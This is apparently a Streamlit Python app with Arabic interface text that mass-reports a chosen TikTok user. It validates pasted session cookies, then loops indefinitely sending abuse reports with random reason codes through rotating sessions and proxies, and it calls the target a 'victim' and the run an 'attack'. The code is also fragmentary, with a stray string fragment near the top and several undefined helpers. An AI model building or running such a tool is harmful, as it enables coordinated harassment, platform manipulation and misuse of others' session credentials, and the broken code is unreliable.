import streamlit as st
              f"&region={country}&priority_region={country}&os=ios&"
              f"cookie_enabled=true&screen_width=375&screen_height=667&"
              f"browser_language=en-US&browser_platform=iPhone&"
              f"browser_name=Mozilla&browser_version=5.0+(iPhone;+CPU+iPhone+OS+15_1+like+Mac+OS+X)+"
              f"AppleWebKit/605.1.15+(KHTML,+like+Gecko)+InspectBrowser&"
              f"browser_online=true&app_language=ar&timezone_name=Asia%2FRiyadh&"
              f"is_page_visible=true&focus_state=true&is_fullscreen=false")

    params = { 1: {"reason": "399"}, 2: {"reason": "310"}, 3: {"reason": "317"}, 4: {"reason": "3142"}, 5: {"reason": "306"}, 6: {"reason": "308"}, 7: {"reason": "3011"}, 8: {"reason": "3052"}, 9: {"reason": "3072"}, 10: {"reason": "303"}, 14: {"reason": "9004"}, 15: {"reason": "90064"}, 16: {"reason": "9010"} }  
    p = params.get(r_type, {"reason": "310"})  
    url = (f"{base_url}{common}&history_len=14&reason={p['reason']}&report_type=user"  
           f"&object_id={target_ID}&owner_id={target_ID}&target={target_ID}"  
           f"&reporter_id={device['reporter_id']}&current_region={country}")  
    rep_headers = { 'Accept': '*/*', 'Cookie': 'sessionid=' + session, 'Host': 'www.tiktok.com', 'User-Agent': generate_user_agent() }  
    data = { "object_id": target_ID, "owner_id": target_ID, "report_type": "user", "target": target_ID }  
    return url, rep_headers, data

def send_report(session, report_url, headers, data, proxies=None):
    try:
        rep = requests.post(report_url, headers=headers, data=data, proxies=proxies, timeout=10)
        return expected_response not in rep.text
    except Exception: return False

def get_random_report_type():
    return random.choice([1,2,3,4,5,6,7,8,9,10,14,15,16])

def validate_session(session):
    check_url = 'https://api16-normal-c-alisg.tiktokv.com/passport/account/info/v2/?aid=1233'
    headers = { 'Host': 'api16-normal-c-alisg.tiktokv.com', 'User-Agent': generate_user_agent(), 'Cookie': 'sessionid=' + session }  
    try:  
        resp = requests.get(check_url, headers=headers, timeout=5)  
        return 'user_id' in resp.text  
    except Exception: return False

def get_target_id(username):
    headers = { 'Host': 'www.tiktok.com', 'User-Agent': generate_user_agent() }
    try:  
        req = requests.get(f'https://www.tiktok.com/@{username}?lang=en', headers=headers)  
        return re.findall(r'"user":{"id":"(.*?)"', req.text)[0]  
    except: return None

# --- واجهة Streamlit التنفيذية ---

st.markdown('<div class="horror-border">', unsafe_allow_html=True)
st.image("https://files.catbox.moe/8z2xdh.jpg", use_column_width=True)
st.markdown('</div>', unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; color: #ff0000;'>قناتي تليجرام: <a href='https://t.me/gx1gx1' style='color: #00ff00;'>gx1gx1</a></h2>", unsafe_allow_html=True)
st.code("علـش @GX1GX1", language="text")

st.subheader(" إعدادات الهجوم")
username = st.text_input("👤 يوزر الضحية (Target Username):")

menu_options = show_menu()
selected_label = st.selectbox("👾 اختر نوع البلاغ:", list(menu_options.keys()))
option = menu_options[selected_label]

sessions_raw = st.text_area(" ألصق السيزنات هنا (كل سطر سيزن):")
proxy_raw = st.text_area(" ألصق البروكسيات هنا (اختياري ):")

if st.button(" بدأ الهــجوم"):
    if not username or not sessions_raw:
        st.error("❌ أدخل اليوزر والسيزنات!")
    else:
        sessions = [s.strip() for s in sessions_raw.split('\n') if s.strip()]
        target_id = get_target_id(username)
        
        if not target_id:
            st.error("❌ المستخدم غير موجود!")
        else:
            st.info("جار التحقق من السيزنات...")
            valid_sessions = [s for s in sessions if validate_session(s)]
            
            if not valid_sessions:
                st.error("لا توجد سيزنات صالحة!")
            else:
                st.success(f"تم العثور على {len(valid_sessions)} سيزن صالح.")
                
                # إدارة البروكسي
                working_proxies = []
                if proxy_raw:
                    p_list = [p.strip() for p in proxy_raw.split('\n') if p.strip()]
                    working_proxies = check_proxies_concurrently(p_list)
                
                success_count = 0
                fail_count = 0
                terminal = st.empty()
                
                while True:
                    for session in valid_sessions:
                        current_type = get_random_report_type() if option in [12, 13] else option
                        url, headers, data = get_report_params(current_type, target_id, session)
                        
                        proxies = None
                        if working_proxies:
                            proxy = random.choice(working_proxies)
                            proxies = {"http": proxy, "https": proxy}
                        
                        if send_report(session, url, headers, data, proxies):
                            success_count += 1
                        else:
                            fail_count += 1
                        
                        terminal.code(f"⚡ [GX1 DARK PROTOCOL RUNNING]\nSUCCESS: {success_count} | FAILED: {fail_count}\nTARGET_ID: {target_id}")
                        time.sleep(2)

